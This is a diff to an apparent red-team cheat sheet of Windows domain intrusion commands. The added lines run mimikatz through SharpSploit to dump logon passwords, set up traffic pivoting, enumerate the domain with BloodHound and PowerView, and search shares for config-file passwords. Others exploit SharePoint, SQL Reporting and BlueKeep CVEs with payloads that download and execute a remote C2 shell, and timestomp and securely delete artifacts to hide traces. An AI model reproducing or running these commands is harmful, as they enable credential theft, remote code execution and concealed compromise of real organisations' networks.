@@ -185,6 +185,7 @@ invoke_file /tmp/Get-Hash.ps1
 Get-Hash
 
 # lsass mini-dump for NTLM or plaintext
+dll-loader -http -path http://<URL>/sharpsploit.dll; [sharpsploit.credentials.mimikatz]::logonpasswords();
 invoke_file /tmp/Out-Minidump.ps1
 Get-Process lsass| Out-Minidump -DumpFilePath C:\temp
 TimeStomp c:\temp\lsass_<PID>.dmp  "01/03/2012 12:12 pm"
@@ -214,19 +215,18 @@ proxychains atexec.py -no-pass -hashes :<NTLMHASH> <DOMAIN>/<USER>@<IP>;
 proxychains smbexec.py -no-pass -hashes :<NTLMHASH> <DOMAIN>/<USER>@<IP>;
 proxychains secretsdump.py -no-pass -hashes :<NTLMHASH> -outputfile <IP>_secrets.txt <DOMAIN>/<USER>@<IP>;
 
-# enumeration domain via host
-invoke_file /tmp/Sharphound.ps1
-Invoke-BloodHound -CollectionMethod DCOnly --NoSaveCache --RandomFilenames --EncryptZip
-TimeStomp c:\temp\<BLOODHOUND>.zip "01/03/2008 12:12 pm"
-download c:\temp\<BLOODHOUND>.zip
-SecureDelete c:\temp\<BLOODHOUND>.zip
+# windows traffic redirection
+netsh interface portproxy add v4tov4 listenport=<PORT> listenaddress=<IP> connectport=<TARGETPORT> connectaddress=<TARGETIP>
+netsh interface portproxy delete v4tov4 listenport=<PORT> listenaddress=<IP>
+netsh interface portproxy add v6tov4 listenport=<PORT> listenaddress=<IP> connectport=<TARGETPORT> connectaddress=<TARGETIP>
+netsh interface portproxy delete v6tov4 listenport=<PORT> listenaddress=<IP>
+netsh interface portproxy show all
 
-# enumeration domain via proxy
-proxychains bloodhound-python -c DCOnly -u <USERNAME>@<DOMAIN> --hashes <HASHES> -dc <DCIP> -gc <GCIP> -d <DOMAIN> -v;
-proxychains pywerview.py get-netuser -w <DOMAIN> -u <USER> --hashes <HASHES> -t <DOMAIN> -d <DOMAIN>
-proxychains pywerview.py get-netcomputer -w <DOMAIN> -u <USER> --hashes <HASHES> --full-data --ping -t <DOMAIN> -d <DOMAIN>
-proxychains findDelegation.py -no-pass -hashes <HASHES> -target-domain <DOMAIN> <DOMAIN/USER>
-proxychains rpcdump.py -port 135 <TARGETDC>|grep "MS-RPRN";
+# linux traffic redirection
+ssh -f -N -L <IP>:<PORT>:<TARGETIP>:<TARGETPORT> <GATEWAYIP>
+socat TCP-LISTEN:<PORT>,bind=<IP>,fork,reuseaddr TCP:<TARGETIP>:<TARGETPORT>
+ssh -f -N -D <IP>:<PORT> root@<GATEWAYIP>
+socat TCP4-LISTEN:445,fork,bind=<IP> SOCKS4:<PROXYIP>:<TARGETIP>:<TARGETPORT>,socksport=<PORT>
 
 # host discovery 
 proxychains nmap -oA NETWORK_ping_sweep -v -T 3 -PP --data "\x41\x41" -n -sn <NETWORK/CIDR>
@@ -238,19 +238,57 @@ proxychains nmap -v --script http-headers -T 3 --open -p80,443 -oA NETWORK_http_
 # fingerprinting services intrusive/loud
 proxychains nmap -v -T 5 -Pn -sT --max-rate 100 --min-rtt-timeout 100ms --max-rtt-timeout 100ms --initial-rtt-timeout 100ms --max-retries 0 -oA NETWORK_FAST_service_scan --open -p53,135,137,139,445,80,443,3389,386,636,5985,2701,1433,1961,1962 <NETWORK/CIDR>
 
-# sharepoint command
+# domain enumeration via host, using bloodhound
+invoke_file /tmp/Sharphound.ps1
+Invoke-BloodHound -CollectionMethod DCOnly --NoSaveCache --RandomFilenames --EncryptZip
+TimeStomp c:\temp\<BLOODHOUND>.zip "01/03/2008 12:12 pm"
+download c:\temp\<BLOODHOUND>.zip
+SecureDelete c:\temp\<BLOODHOUND>.zip
+
+# domain enumeration domain via host, using powershell
+invoke_file /tmp/PowerView.ps1
+$boxes=get-netcomputer -domain <DOMAIN> -fulldata
+$boxes|%{$_|add-member -membertype noteproperty -name ipaddress -value (get-ipaddress $_.dnshostname).ipaddress -force};
+
+# enumeration domain via proxy
+proxychains bloodhound-python -c DCOnly -u <USERNAME>@<DOMAIN> --hashes <HASHES> -dc <DCIP> -gc <GCIP> -d <DOMAIN> -v;
+proxychains pywerview.py get-netuser -w <DOMAIN> -u <USER> --hashes <HASHES> -t <DOMAIN> -d <DOMAIN>
+proxychains pywerview.py get-netcomputer -w <DOMAIN> -u <USER> --hashes <HASHES> --full-data --ping -t <DOMAIN> -d <DOMAIN>
+proxychains findDelegation.py -no-pass -hashes <HASHES> -target-domain <DOMAIN> <DOMAIN/USER>
+proxychains rpcdump.py -port 135 <TARGETDC>|grep "MS-RPRN";
+
+# file share access
+mount -t cifs //<PROXYIP>/<SHARE> /mnt/share -o username=<USER>,password=<PASSWORD>,domain=<DOMAIN>,iocharset=utf8,file_mode=0777,dir_mode=0777
+net share Desktop=c:\users\administrator\desktop /grant:everyone,FULL
+net share Desktop /delete
+net use p: \\<IP>\<SHARE>
+net use p: http:\\<WEBDAVURL>
+net use p: /delete
+
+# enumerating shares via host, powershell
+gci -file -filter *.config -recurse -path x:\ |%{([xml](gc $_.fullname)).selectnodes("/configuration/appSettings/add")}
+gci -file -filter *.config -recurse -path x:\ |%{([xml](gc $_.fullname)).selectnodes("/configuration/connectionStrings/add")}
+gci -file -filter *.config -recurse -path x:\ |%{([xml](gc $_.fullname)).selectnodes("/configuration/system.web/machineKey")}
+$boxes|%{$_|add-member -membertype noteproperty -name shares -value (invoke-sharefinder -computername $_.dnshostname -excludestandard -checkshareaccess) -force};
+foreach($item in $shares){$share,$desc=$item -split ' ',2;gci -file -filter *.config -path "$share"|%{([xml](gc $_.fullname)).selectnodes("configuration/appSettings/add")|where key -match pass}}
+
+# database access
+proxychains mssqlclient.py -port <PORT> -db <DB> <USER>:<PASSWORD>@<IP>
+proxychains mssqlclient.py -windows-auth -no-pass -hashes :<HASH> -dc-ip <DCIP> -port <PORT> -db <DB> <DOMAIN/USER>:<PASSWORD>@<IP>
+
+# sharepoint, command based
 proxychains python sharepoint_cve-2019-0604.py -target http://<URL> -username <USER> -domain <DOMAIN> -password <PASSWORD> -version 2016 -command "powershell.exe -exec bypass -noninteractive -windowstyle hidden -c iex((new-object system.net.webclient).downloadstring('<URL>/c2_icmp_shell.ps1'))"
 proxychains python sharepoint_cve-2020-0646.py -target http://<URL> -username <USER> -domain <DOMAIN> -password <PASSWORD> -command "powershell.exe -exec bypass -noninteractive -windowstyle hidden -c iex((new-object system.net.webclient).downloadstring('<URL>/c2_icmp_shell.ps1'))"
 
-# sharepoint edit gadget
+# sharepoint, requires editing gadget
 ysoserial.exe -g TypeConfuseDelegate -f LosFormatter -c "powershell.exe -exec bypass -noninteractive -windowstyle hidden -c iex((new-object system.net.webclient).downloadstring('<URL>/c2_icmp_shell.ps1'))"
 proxychains python sharepoint_cve-2020-1147.py -target http://<URL> -username <USER> -domain <DOMAIN> -password <PASSWORD>
 
-# sharepoint edit gadget
+# sharepoint, requires editing gadget
 ysoserial.exe -g TypeConfuseDelegate -f LosFormatter -c "powershell.exe -exec bypass -noninteractive -windowstyle hidden -c iex((new-object system.net.webclient).downloadstring('<URL>/c2_icmp_shell.ps1'))" -o base64 
 proxychains python sqlreport_cve_2020-0618.py -target http://<URL> -username <USER> -domain <DOMAIN> -password <PASSWORD> -payload shell
 
-# rdp, edit shellcode
+# rdp, requires editing shellcode
 msfvenom -a x64 --platform windows -p windows/x64/exec cmd="powershell \"iex(new-object net.webclient).downloadstring('<URL>/c2_icmp_shell.ps1')\"" -f  python
 proxychains python bluekeep_cve-2019-0708.py <IP> 
 
